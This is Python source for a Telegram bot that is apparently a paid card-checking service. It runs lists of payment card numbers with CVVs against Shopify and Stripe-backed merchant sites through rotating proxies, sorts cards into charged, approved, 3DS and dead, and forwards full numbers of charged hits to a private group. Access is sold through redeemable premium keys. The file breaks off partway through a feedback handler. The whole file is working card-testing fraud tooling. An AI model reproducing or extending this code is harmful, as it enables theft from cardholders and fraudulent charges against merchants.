from telethon import TelegramClient, events, Button
from telethon.tl.custom.message import Message as _TLMessage
import asyncio, itertools, aiofiles, os, random, time, json, re
import html as _html

import config
from config import (
    API_ID, API_HASH, BOT_TOKEN,
    BOT_BRAND, OWNER_NAME, OWNER_USERNAME, OWNER_ID, BOT_USERNAME, DEV_LINE,
    PREMIUM_FILE, SITES_FILE, PROXY_FILE, USER_PROXY_FILE, USER_POOL_FILE,
    ADMIN_IDS, ADMIN_ID, _DEFAULT_ADMINS, _save_admin_ids,
    LIMITS, MASS_WORKERS,
)
from emojis import pe, SEP
from keyboards import (
    _raw_post, raw_send, raw_edit, nav_edit,
    rows_main, rows_gates, rows_proxy, rows_admin, rows_admin_users,
    rows_admin_sites, rows_admin_proxy_pool, rows_owner_api_eps,
    rows_owner_keys, rows_owner_gc, rows_stop,
    _get_chat_member, _get_chat_info, _get_join_link, _to_chat_id,
)
from storage import (
    user_proxies, user_pool_enabled,
    load_user_proxies, save_user_proxies,
    load_user_pool, save_user_pool,
    get_user_proxy_list, set_user_proxies, remove_user_proxy,
    get_file_lines, load_premium_users, load_sites, load_proxies,
    is_admin, is_premium, get_user_limit,
    get_proxies_for_user, extract_cc, make_progress_bar,
    load_gc_config, save_gc_config,
    load_keys, save_keys, generate_key, redeem_key, list_keys, key_expiry_text,
    add_feedback, get_feedback, remove_feedback,
    get_max_site_price, set_max_site_price,
)
from bin_db import get_bin_info, load_bins
from cards import build_result_card, checker_line, mask_site
from check_engine import (
    check_card_with_retry, test_proxy, test_site, test_site_with_price, get_proxy_ip,
    clear_session_bad_sites, clear_error_log,
    load_api_endpoints, save_api_endpoints, normalize_proxy, _load_proxies_file,
    add_api_endpoint, remove_api_endpoint_by_index, remove_api_endpoint_by_url,
    set_active_endpoint_by_index, get_active_endpoint, get_active_idx,
    _is_fatal_site_error,
)
from extra_gates import check_st1, check_st5, check_stripe_auth, check_stripe_auth_1
from keyboards import _send_notification, _pin_message_botapi
from backup import create_backup_zip, restore_backup_zip, backup_stats
from datetime import datetime, timedelta

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions: dict = {}
pending_checks:  dict = {}
_reported_site_errors: set = set()
_site_error_counts: dict = {}

_orig_send_message = bot.send_message
_orig_edit_message = bot.edit_message

def _strip_tg_emoji(text):
    if not text: return text
    return re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)

def _is_doc_invalid(e):
    s = str(e).upper()
    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s

_orig_tl_edit = _TLMessage.edit

async def _safe_tl_edit(self, *args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_tl_edit(self, *args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            new_args = list(args)
            if new_args and isinstance(new_args[0], str):
                new_args[0] = _strip_tg_emoji(new_args[0])
            if 'text' in kwargs: kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_tl_edit(self, *new_args, **kwargs)
        raise
_TLMessage.edit = _safe_tl_edit

async def _send_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_send_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 2 and isinstance(args[1], str):
                args = (args[0], _strip_tg_emoji(args[1])) + args[2:]
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_send_message(*args, **kwargs)
        raise

async def _edit_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_edit_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 3 and isinstance(args[2], str):
                args = args[:2] + (_strip_tg_emoji(args[2]),) + args[3:]
            if 'text' in kwargs and isinstance(kwargs['text'], str):
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_edit_message(*args, **kwargs)
        raise

bot.send_message = _send_message_no_preview
bot.edit_message = _edit_message_no_preview

# ══════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════
async def get_display_name(uid):
    try:
        e = await bot.get_entity(uid)
        n = ((getattr(e, 'first_name', None) or '') + ' ' + (getattr(e, 'last_name', None) or '')).strip()
        return n or str(uid)
    except: return str(uid)

async def get_user_info(uid):
    try:
        e = await bot.get_entity(uid)
        return getattr(e, 'first_name', None) or str(uid), getattr(e, 'username', None)
    except: return str(uid), None

def _is_3ds(msg: str) -> bool:
    m = (msg or '').lower()
    return any(x in m for x in ('3d secure','3ds','authentication required','otp required'))

def _is_insuf(msg: str) -> bool:
    return 'insufficient' in (msg or '').lower()

def _is_proxy_err_msg(msg: str) -> bool:
    m = (msg or '').lower()
    return any(k in m for k in (
        'clienthttpproxyerror','proxyerror',
        'proxy error','proxy_error','proxy timeout',
        'proxy fail','connectionpool','httpsconnectionpool',
    ))

def _normalize_extra(result, gate_key, card):
    s = result.get('Status', 'Error')
    if 'Charged' in s:   status = 'Charged'
    elif 'Approved' in s: status = 'Approved'
    else:                 status = 'Dead'
    gw = {'st1': 'Stripe 1$ (FormStack)',
          'st5': 'Stripe 5$ (GiveWP)',
          'auth': 'Stripe Auth2 $0 (WooCommerce)',
          'auth1': 'Stripe Auth2 $0 v2 (WooCommerce)'}.get(gate_key, '-')
    pr = {'st1': '$1.00', 'st5': '$5.00',
          'auth': '$0.00', 'auth1': '$0.00'}.get(gate_key, '-')
    site = result.get('Site')
    return {'card': card, 'status': status, 'message': result.get('Response', ''),
            'gateway': gw, 'price': pr, 'receipt_url': '', 'time': 0, 'site': site}

async def _require_user_proxies(event_or_uid):
    if hasattr(event_or_uid, 'sender_id'):
        uid = event_or_uid.sender_id; is_event = True
    else:
        uid = int(event_or_uid); is_event = False
    proxies = get_user_proxy_list(uid)
    if not proxies:
        msg = pe(
            f"❌ <b>No Proxies Set</b>\n<b>{SEP}</b>\n"
            f"⚠️ You must add your own proxies before checking.\n"
            f"<b>{SEP}</b>\n"
            f"<code>/setproxy ip:port</code>\n"
            f"<code>/setproxy ip:port:user:pass</code>\n"
            f"<code>/setproxy user:pass@ip:port</code>\n"
            f"<b>{SEP}</b>\n"
            f"Multiple (one per line):\n"
            f"<code>/setproxy\nip:port\nip:port:user:pass</code>"
        )
        if is_event:
            await event_or_uid.reply(msg, parse_mode='html')
            return None
        return None
    return proxies

async def _maybe_remove_user_proxy(user_id, proxy, msg):
    if not proxy or not _is_proxy_err_msg(msg): return
    tp = await test_proxy(proxy)
    if tp.get('status') != 'dead': return
    ul = get_user_proxy_list(user_id)
    if proxy in ul:
        set_user_proxies(user_id, [p for p in ul if p != proxy])
        try:
            await bot.send_message(user_id, pe(
                f"🗑️ <b>Dead Proxy Removed</b>\n<b>{SEP}</b>\n"
                f"📡 <code>{proxy}</code>\n"
                f"⚠️ Tested dead — removed from your list.\n"
                f"<b>{SEP}</b>\n"
                f"Add a new one: <code>/setproxy ip:port</code>"), parse_mode='html')
        except: pass

async def _report_site_error(site_url: str, error: str):
    key = f"{site_url}"
    if key in _reported_site_errors: return
    _reported_site_errors.add(key)
    try:
        await bot.send_message(OWNER_ID, pe(
            f"⚠️ <b>Site Check Failed</b>\n<b>{SEP}</b>\n"
            f"🔗 <b>URL:</b> <code>{site_url}</code>\n"
            f"❌ <b>Error:</b> <code>{str(error)[:150]}</code>\n"
            f"<b>{SEP}</b>\n"
            f"⏰ {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')
    except: pass

async def _handle_fatal_site_error(site_url: str, error: str):
    """Increment error counter. On 2nd hit → remove from pool + notify owner."""
    global _site_error_counts
    if not site_url: return
    _site_error_counts[site_url] = _site_error_counts.get(site_url, 0) + 1
    cnt = _site_error_counts[site_url]

    if cnt < 2:
        return

    curr = load_sites()
    if site_url not in curr:
        _site_error_counts.pop(site_url, None)
        return

    new_pool = [s for s in curr if s != site_url]
    try:
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for s in new_pool: await f.write(f"{s}\n")
    except: return

    _site_error_counts.pop(site_url, None)

    try:
        await bot.send_message(OWNER_ID, pe(
            f"🗑️ <b>Site Auto-Removed</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔗 <b>URL:</b> <code>{site_url}</code>\n"
            f"❌ <b>Error:</b> <code>{str(error)[:120]}</code>\n"
            f"🔁 <b>Hits:</b> {cnt}\n"
            f"📋 <b>Remaining:</b> {len(new_pool)} sites\n"
            f"<b>{SEP}</b>\n"
            f"⏰ {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')
    except: pass

# ══════════════════════════════════════════════════════════
# GC forwarding
# ══════════════════════════════════════════════════════════
def _mask_card(card):
    p = card.split('|')
    if len(p) != 4: return card
    pan, mm, yy, cvv = p
    return pan[:6] + 'x' * (len(pan) - 10) + pan[-4:] + f'|{mm}|{yy}|***'

async def _forward_charged(result, gate_name, user_id):
    cfg = load_gc_config()
    user_name, _ = await get_user_info(user_id)
    private_gc = cfg.get('private_gc')
    if private_gc:
        msg = pe(
            f"💎 <b>CHARGED  —  {gate_name}</b>\n<b>{SEP}</b>\n"
            f"🃏 <b>Card</b>      »  <code>{result['card']}</code>\n"
            f"🌐 <b>Gateway</b>   »  {result.get('gateway', '-')}\n"
            f"💵 <b>Amount</b>    »  {result.get('price', '-')}\n"
            f"💬 <b>Response</b>  »  {result.get('message', '-')}\n"
            f"<b>{SEP}</b>\n"
            f"👤 <b>By</b>  »  {user_name} (<code>{user_id}</code>)\n{DEV_LINE}")
        try: await bot.send_message(int(private_gc), msg, parse_mode='html')
        except: pass
    masked = _mask_card(result['card'])
    for k in ('public_gc','public_channel'):
        t = cfg.get(k)
        if t:
            msg = pe(
                f"💎 <b>CHARGED  —  {gate_name}</b>\n<b>{SEP}</b>\n"
                f"🃏 <code>{masked}</code>\n🌐 {result.get('gateway', '-')}\n"
                f"💵 {result.get('price', '-')}\n<b>{SEP}</b>\n👤 {user_name}")
            try: await bot.send_message(int(t), msg, parse_mode='html')
            except: pass

async def _log_to_gc(result, gate_name, user_id):
    cfg = load_gc_config()
    log_gc = cfg.get('log_gc')
    if not log_gc: return
    user_name, _ = await get_user_info(user_id)
    icon = {'Charged': '💎', 'Approved': '✅', 'Dead': '❌'}.get(result.get('status'), '❓')
    price = result.get('price', '-')
    site = result.get('site')
    site_line = f"📍 <b>Site</b>  »  <code>{mask_site(site)}</code>\n" if site else ""
    msg = pe(
        f"{icon} <b>{result.get('status','?').upper()}  —  {gate_name}</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <code>{result['card']}</code>\n"
        f"{site_line}"
        f"💵 <b>Price</b>  »  {price}\n"
        f"💬 {result.get('message', '-')}\n"
        f"👤 {user_name} (<code>{user_id}</code>)")
    try: await bot.send_message(int(log_gc), msg, parse_mode='html')
    except: pass

# ══════════════════════════════════════════════════════════
# Realtime hit
# ══════════════════════════════════════════════════════════
async def send_realtime_hit(user_id, result, hit_type):
    bin_info = await get_bin_info(result['card'].split('|')[0])
    result['bin_info'] = bin_info
    name, username = await get_user_info(user_id)
    cname = name if username else str(user_id)
    msg = build_result_card(result, bin_info, user_id, cname)
    msg_id = await asyncio.to_thread(_send_notification, user_id, msg)
    if msg_id and hit_type in ("Charged", "Approved"):
        await asyncio.to_thread(_pin_message_botapi, user_id, msg_id)

async def send_insufficient_log(user_id, result):
    from cards import _clean_response
    price = result.get('price', '-')
    await bot.send_message(user_id, pe(
        f"💸 <b>Insufficient Funds</b>\n<b>{SEP}</b>\n"
        f"🃏 <b>Card</b>    »  <tg-spoiler>{result['card']}</tg-spoiler>\n"
        f"💬 <b>Reason</b>  »  {_clean_response(result.get('message',''))}\n"
        f"💵 <b>Price</b>   »  {price}\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

# ══════════════════════════════════════════════════════════
# Progress + final
# ══════════════════════════════════════════════════════════
async def update_mass_progress(user_id, message_id, results, checked, last_res=None, gate_name="Mass Check"):
    bar = make_progress_bar(checked, results['total'])
    latest = ""
    if last_res:
        st = last_res['status']; msg_r = last_res.get('message', '') or ''
        if st == 'Charged': se = "💎"; label = "CHARGED"
        elif st == 'Approved': se = "✅"; label = "APPROVED"
        elif _is_insuf(msg_r): se = "💸"; label = "Insufficient"
        elif _is_3ds(msg_r): se = "⚠️"; label = "3DS"
        else: se = "🚫"; label = "Declined"
        reason = msg_r[:45] if msg_r else label
        t = round(time.time() - results.get('last_card_time', time.time()), 2)

        site_raw  = last_res.get('site') or ''
        site_line = f"📍 <code>{mask_site(site_raw)}</code>\n" if site_raw else ""

        latest = (f"\n<b>{SEP}</b>\n⚡ <b>Last Result</b>\n"
                  f"{se}  <tg-spoiler>{last_res['card']}</tg-spoiler>\n"
                  f"{site_line}"
                  f"💫  {reason}  ·  {t}s")
    text = pe(
        f"<b>🔥 {gate_name}  —  Running</b>\n<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"☄️ <b>Checked</b>   »  {checked}\n"
        f"💎 <b>Charged</b>   »  {len(results['charged'])}\n"
        f"✅ <b>Approved</b>  »  {len(results['approved'])}\n"
        f"⚠️ <b>3DS</b>       »  {len(results.get('tds', []))}\n"
        f"<code>{bar}</code>{latest}")
    await raw_edit(user_id, message_id, text, rows_stop())

def _file_row(label, r):
    gate = r.get('gateway', 'Shopify'); price = r.get('price', '-')
    site = r.get('site')
    bi = r.get('bin_info')
    bank_line = ""
    if bi:
        brand, btype, level, bank, country, flag = bi
        bank_line = f"  Bank    : {bank} | {country} {flag} | {brand} {btype} {level}\n"
    site_line = f"  Site    : {site}\n" if site else ""
    return (f"  [{label}]\n  CC      : {r['card']}\n  Gateway : {gate}\n"
            f"  Amount  : {price}\n{site_line}"
            f"  Message : {r.get('message','')[:80]}\n"
            + bank_line + f"  {'─'*36}\n")

async def send_final_results(user_id, results, gate_name="Mass Check"):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    bar = make_progress_bar(results['total'], results['total'])
    ch = len(results['charged']); ap = len(results['approved'])
    td = len(results.get('tds', []))
    dead = len(results.get('dead', []))
    cname = await get_display_name(user_id)
    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    summary = pe(
        f"<b>🔥 {gate_name}  —  Complete</b>\n<b>{SEP}</b>\n<blockquote>"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"💎 <b>Charged</b>   »  {ch}\n✅ <b>Approved</b>  »  {ap}\n"
        f"⚠️ <b>3DS</b>       »  {td}\n❌ <b>Dead</b>      »  {dead}\n"
        f"<code>{bar}</code></blockquote>\n<b>{SEP}</b>\n"
        f"⏱️ <b>Time</b>  »  {time_fmt}\n<b>{SEP}</b>\n"
        f"{checker_line(user_id, cname)}\n{DEV_LINE}")
    await bot.send_message(user_id, summary, parse_mode='html')

    if results['charged']:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  💎 CHARGED HITS\n{D}\n\n"]
        for r in results['charged']: lines.append(_file_row("💎 CHARGED", r))
        lines.append(f"\n  Charged  »  {ch}\n{D}\n")
        async with aiofiles.open("charged.txt", 'w') as f: await f.write("".join(lines))
        await bot.send_file(user_id, "charged.txt",
            caption=pe(f"💎 <b>Charged Hits  »  {ch}</b>\n{DEV_LINE}"), parse_mode='html')
        try: os.remove("charged.txt")
        except: pass

    combo = results['approved'] + results.get('tds', [])
    if combo:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  HITS FILE\n{D}\n\n"]
        if results['approved']:
            lines.append(f"  ── ✅ APPROVED  ({ap}) ────────────────────\n\n")
            for r in results['approved']: lines.append(_file_row("✅ APPROVED", r))
        if results.get('tds'):
            lines.append(f"\n  ── ⚠️  3DS  ({td}) ──────────────────────\n\n")
            for r in results['tds']: lines.append(_file_row("⚠️ 3DS", r))
        lines.append(f"\n{D}\n  Approved: {ap}  ·  3DS: {td}\n{D}\n")
        async with aiofiles.open("approved.txt", 'w') as f: await f.write("".join(lines))
        await bot.send_file(user_id, "approved.txt",
            caption=pe(f"✅ <b>Hits File</b>\n<b>{SEP}</b>\n✅ Approved: {ap}\n⚠️ 3DS: {td}\n{DEV_LINE}"),
            parse_mode='html')
        try: os.remove("approved.txt")
        except: pass

# ══════════════════════════════════════════════════════════
# Mass runner — with per-run bad-site skip
# ══════════════════════════════════════════════════════════
async def run_mass_check(user_id, cards, progress_msg_id, gate_key="shopify",
                         gate_name="Mass Check", concurrency=None):
    session_key = f"{user_id}_{progress_msg_id}"
    clear_session_bad_sites(); clear_error_log()
    _reported_site_errors.clear()
    active_sessions[session_key] = {'paused': False}

    proxies = get_user_proxy_list(user_id)
    if not proxies:
        active_sessions.pop(session_key, None)
        try:
            await bot.send_message(user_id, pe(
                f"❌ <b>No Proxies Set</b>\n<b>{SEP}</b>\n"
                f"Set one with <code>/setproxy ip:port</code> first."),
                parse_mode='html')
        except: pass
        return

    sites = load_sites()
    bad_sites_this_run = set()

    all_results = {'charged': [], 'approved': [], 'dead': [], 'tds': [],
                   'total': len(cards), 'start_time': time.time(),
                   'last_card_time': time.time()}

    if gate_key == 'shopify':
        if not sites:
            active_sessions.pop(session_key, None)
            try: await bot.send_message(user_id, pe(f"❌ <b>No Sites Configured</b>"), parse_mode='html')
            except: pass
            return
        async def gate_fn(c):
            available = [s for s in sites if s not in bad_sites_this_run]
            return await check_card_with_retry(c, available or sites, proxies)
    elif gate_key == 'st1':
        async def gate_fn(c): return await check_st1(c, random.choice(proxies))
    elif gate_key == 'st5':
        async def gate_fn(c): return await check_st5(c, random.choice(proxies))
    elif gate_key == 'auth':
        async def gate_fn(c): return await check_stripe_auth(c, random.choice(proxies))
    elif gate_key == 'auth1':
        async def gate_fn(c): return await check_stripe_auth_1(c, random.choice(proxies))
    else:
        async def gate_fn(c):
            available = [s for s in sites if s not in bad_sites_this_run]
            return await check_card_with_retry(c, available or sites, proxies)

    n_workers = concurrency or (MASS_WORKERS if gate_key == 'shopify' else 20)

    try:
        queue = asyncio.Queue()
        last_update = [time.time()]
        for c in cards: queue.put_nowait(c)

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                sess = active_sessions.get(session_key)
                if not sess: break
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    sess = active_sessions.get(session_key)
                    if not sess: return
                try: card = queue.get_nowait()
                except asyncio.QueueEmpty: break
                t0 = time.time()
                try:
                    raw = await gate_fn(card)
                except Exception as e:
                    raw = {'Status': 'Error', 'Response': f'{type(e).__name__}', 'Card': card}
                result = raw if gate_key == 'shopify' else _normalize_extra(raw, gate_key, card)
                result['time'] = round(time.time() - t0, 2)
                all_results['last_card_time'] = time.time()
                st = result.get('status', ''); msg_r = result.get('message', '') or ''

                proxy_used = result.get('proxy')
                if proxy_used:
                    await _maybe_remove_user_proxy(user_id, proxy_used, msg_r)

                if _is_fatal_site_error(msg_r):
                    site = result.get('site')
                    if site:
                        bad_sites_this_run.add(site)
                        await _handle_fatal_site_error(site, msg_r)
                        await _report_site_error(site, msg_r)

                if st == 'Charged':
                    result['bin_info'] = await get_bin_info(card.split('|')[0])
                    all_results['charged'].append(result)
                    await send_realtime_hit(user_id, result, 'Charged')
                    await _forward_charged(result, gate_name, user_id)
                elif st == 'Approved':
                    result['bin_info'] = await get_bin_info(card.split('|')[0])
                    all_results['approved'].append(result)
                    await send_realtime_hit(user_id, result, 'Approved')
                elif _is_3ds(msg_r):
                    result['bin_info'] = await get_bin_info(card.split('|')[0])
                    all_results['tds'].append(result)
                elif _is_insuf(msg_r):
                    all_results['approved'].append(result)
                    await send_insufficient_log(user_id, result)
                else:
                    all_results['dead'].append(result)
                await _log_to_gc(result, gate_name, user_id)

                checked = (len(all_results['charged']) + len(all_results['approved']) +
                           len(all_results['dead']) + len(all_results.get('tds', [])))
                if time.time() - last_update[0] >= 3:
                    last_update[0] = time.time()
                    try:
                        await update_mass_progress(user_id, progress_msg_id,
                                                   all_results, checked, result, gate_name)
                    except: pass

        workers = [asyncio.create_task(worker()) for _ in range(min(n_workers, len(cards)))]
        await asyncio.gather(*workers)
    except: pass
    finally:
        active_sessions.pop(session_key, None)
        await send_final_results(user_id, all_results, gate_name)

def _admin_panel_text():
    pcount = len(load_premium_users())
    scount = len(load_sites())
    d = load_api_endpoints()
    eps = d['endpoints']; aidx = d['active_idx']
    if 0 <= aidx < len(eps):
        active_url = eps[aidx]['url']; active_key = eps[aidx].get('key')
    else:
        active_url = ''; active_key = None
    short = active_url.replace('http://', '').replace('https://', '')[:30] or '-'
    key_tag = " 🔑" if active_key else ""
    max_p = get_max_site_price()
    return pe(
        f"<b>👑 Admin Panel</b>  —  <b>{BOT_BRAND}</b>\n<b>{SEP}</b>\n<blockquote>"
        f"🟢 <b>Status</b>      »  Online\n"
        f"👤 <b>Users</b>       »  {pcount} trusted\n"
        f"🌐 <b>Sites</b>        »  {scount} loaded\n"
        f"🔌 <b>Active API</b>  »  <code>{short}</code>{key_tag}\n"
        f"💰 <b>Max Price</b>   »  ${max_p:.2f}"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n{DEV_LINE}")

def _api_endpoints_panel_text(d: dict = None):
    if d is None: d = load_api_endpoints()
    eps = d['endpoints']; aidx = d['active_idx']
    active_url = eps[aidx]['url'] if 0 <= aidx < len(eps) else '-'
    active_short = active_url.replace('http://','').replace('https://','')
    return pe(
        f"<b>🔌 API Endpoints</b>\n<b>{SEP}</b>\n"
        f"🟢 <b>Active</b>  »  <code>{active_short}</code>\n"
        f"📊 <b>Total</b>   »  {len(eps)} endpoint{'s' if len(eps) != 1 else ''}\n"
        f"<b>{SEP}</b>\n"
        f"Tap a ⚪ button below to switch active API\n"
        f"<b>{SEP}</b>\n"
        f"🔑 = endpoint has API key attached\n"
        f"<b>{SEP}</b>\n"
        f"➕ Add: <code>/addapi URL [KEY]</code>\n"
        f"❌ Remove: <code>/rmapi 2</code> or <code>/rmapi URL</code>\n"
        f"<b>{SEP}</b>\n{DEV_LINE}")

async def _check_force_join(uid) -> list:
    cfg = load_gc_config()
    req = cfg.get('required_channels', [])
    if not req: return []
    missing = []
    for ch in req:
        chat_ref = ch
        if isinstance(chat_ref, str) and chat_ref.lstrip('-').isdigit():
            chat_ref = int(chat_ref)
        ok = await asyncio.to_thread(_get_chat_member, chat_ref, uid)
        if not ok: missing.append(ch)
    return missing

# ══════════════════════════════════════════════════════════
# GC slot setter
# ══════════════════════════════════════════════════════════
async def _set_gc_slot(event, slot_key: str, slot_name: str):
    if event.sender_id != OWNER_ID: return
    parts = event.message.text.strip().split(maxsplit=1)
    cfg = load_gc_config(); target = None

    if len(parts) > 1:
        val = parts[1].strip()
        if val.lstrip('-').isdigit(): target = int(val)
        elif val.startswith('@'):
            info = await asyncio.to_thread(_get_chat_info, val)
            if not info:
                await event.reply(pe(
                    f"❌ <b>Cannot resolve</b> <code>{val}</code>\n"
                    f"<b>{SEP}</b>\nMake bot <b>admin</b> in that chat first."),
                    parse_mode='html'); return
            target = info.get('id')
        elif val.startswith('https://t.me/'):
            tail = val.replace('https://t.me/', '').split('?')[0].split('/')[0]
            uname = f"@{tail}"
            info = await asyncio.to_thread(_get_chat_info, uname)
            if not info:
                await event.reply(pe(f"❌ <b>Cannot resolve</b> <code>{val}</code>"), parse_mode='html'); return
            target = info.get('id')
        else:
            await event.reply(pe(
                f"❌ <b>Invalid format</b>\n<b>{SEP}</b>\n"
                f"Use <code>-100...</code>, <code>@username</code>, or <code>https://t.me/...</code>"),
                parse_mode='html'); return
    else:
        if event.chat_id == event.sender_id:
            await event.reply(pe(
                f"❌ <b>No target specified</b>\n<b>{SEP}</b>\n"
                f"Send this <b>inside the GC/channel</b>, or provide ID:\n"
                f"<code>{event.message.text.split()[0]} -1003979425846</code>"),
                parse_mode='html'); return
        target = event.chat_id

    try:
        test_msg = await bot.send_message(target, "✅ Test", parse_mode='html')
        try: await test_msg.delete()
        except: pass
    except Exception as e:
        await event.reply(pe(
            f"⚠️ <b>Cannot post in that chat</b>\n<b>{SEP}</b>\n"
            f"🆔 <code>{target}</code>\n⚠️ {str(e)[:120]}\n"
            f"<b>{SEP}</b>\nMake bot <b>admin</b> and retry."), parse_mode='html'); return

    cfg[slot_key] = target; save_gc_config(cfg)
    await event.reply(pe(
        f"✅ <b>{slot_name} linked</b>\n<b>{SEP}</b>\n"
        f"🆔 <code>{target}</code>\n<b>{SEP}</b>\nTest message sent ✓ deleted"),
        parse_mode='html')

# ══════════════════════════════════════════════════════════
# Backup helpers
# ══════════════════════════════════════════════════════════
def _backup_caption(prefix="Backup"):
    stats = backup_stats()
    return pe(
        f"📦 <b>{prefix} — {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</b>\n"
        f"<b>{SEP}</b>\n<blockquote>"
        f"👤 <b>Users</b>          »  {stats['users']}\n"
        f"🌐 <b>Sites</b>          »  {stats['sites']}\n"
        f"📡 <b>Proxies</b>        »  {stats['proxies']}\n"
        f"🔌 <b>API Endpoints</b>  »  {stats['api_endpoints']}\n"
        f"🔑 <b>Keys</b>           »  {stats['keys_total']} ({stats['keys_unused']} unused)\n"
        f"🛡 <b>GC Links</b>      »  {stats['gc_links']}"
        f"</blockquote>\n<b>{SEP}</b>\n"
        f"♻️ Restore with <code>/restore</code> (reply to this file)\n"
        f"{DEV_LINE}")

async def _send_backup_to(chat_id):
    data = create_backup_zip()
    fname = f"backup_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
    with open(fname, 'wb') as f: f.write(data)
    try:
        await bot.send_file(chat_id, fname,
                            caption=_backup_caption("Backup"), parse_mode='html')
    finally:
        try: os.remove(fname)
        except: pass

# ══════════════════════════════════════════════════════════
# /start
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id; chat_id = event.chat_id
    in_group = (chat_id != uid)
    if not in_group:
        try:
            rm = await bot.send_message(uid, "\u200b", buttons=Button.clear())
            await asyncio.sleep(0.3)
            await bot.delete_messages(uid, rm.id)
        except: pass
    missing = await _check_force_join(uid)
    if missing and not is_admin(uid):
        btns = []
        for ch in missing:
            link = await asyncio.to_thread(_get_join_link, ch)
            label = ch if (isinstance(ch, str) and ch.startswith('@')) else "Channel"
            if link: btns.append([{"text": f"📢 Join {label}", "url": link}])
            else: btns.append([{"text": f"📢 {ch}", "callback_data": "noop"}])
        btns.append([{"text": "✅ I Joined", "callback_data": "check_join"}])
        await raw_send(uid, pe(
            f"<b>🛡 Join Required</b>\n<b>{SEP}</b>\n"
            f"Please join the required channel(s) to use the bot.\n"
            f"<b>{SEP}</b>\nThen tap <b>✅ I Joined</b>."), btns)
        return
    try:
        s = await event.get_sender()
        username = f"@{s.username}" if s.username else f"ID:{uid}"
        firstname = s.first_name or "User"
    except:
        username = f"ID:{uid}"; firstname = "User"
    lim = get_user_limit(uid)
    if is_admin(uid): icon, sl = "👑", "Admin"
    elif is_premium(uid): icon, sl = "✅", "Premium"
    else: icon, sl = "🚫", "No Access"
    text = pe(
        f"<b>⚡ Welcome, {firstname}!</b>\n<b>{SEP}</b>\n<blockquote>"
        f"👤 <b>User</b>     »  {username}\n"
        f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{icon} <b>Status</b>  »  {sl}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file</blockquote>\n"
        f"<b>{SEP}</b>\nSelect an option below to get started.\n<b>{SEP}</b>\n{DEV_LINE}")
    dest = chat_id if in_group else uid
    await raw_send(dest, text, rows_main(),
                   reply_to=event.message.id if in_group else None)

@bot.on(events.NewMessage(pattern=r'^/redeem(\s+.*)?$'))
async def redeem_cmd(event):
    uid = event.sender_id
    parts = event.message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(pe(f"🔑 <b>Redeem Key</b>\n<b>{SEP}</b>\nUsage: <code>/redeem OGGY-PROO-XXXX</code>"),
                          parse_mode='html'); return
    ok, msg = redeem_key(parts[1].strip(), uid)
    if not ok:
        await event.reply(pe(f"❌ <b>Redemption Failed</b>\n<b>{SEP}</b>\n{msg}"), parse_mode='html'); return
    curr = load_premium_users()
    if str(uid) not in curr:
        async with aiofiles.open(PREMIUM_FILE, 'a') as f: await f.write(f"{uid}\n")
    await event.reply(pe(
        f"✅ <b>Key Redeemed</b>\n<b>{SEP}</b>\n"
        f"🎉 You now have premium access!\nUse /start to open the dashboard.\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

# ══════════════════════════════════════════════════════════
# /fb — feedback
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/fb(\s+[\s\S]+)?$'))
async def fb_cmd(event):
    uid = event.sender_id
    content = ''; reply = None
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.text: content = reply.text
    else:
        parts = event.message.text.split(maxsplit=1)
        if len(parts) > 1: content = parts[1].strip()
    has_media = bool(reply and (reply.media or reply.photo or reply.document))
    if not content and not has_media:
        await event.reply(pe(
            f"📝 <b>Feedback</b>\n<b>{SEP}</b>\n"
            f"Usage: <code>/fb Your message here</code>\n"
            f"Or reply to any message with <code>/fb</code>\n"
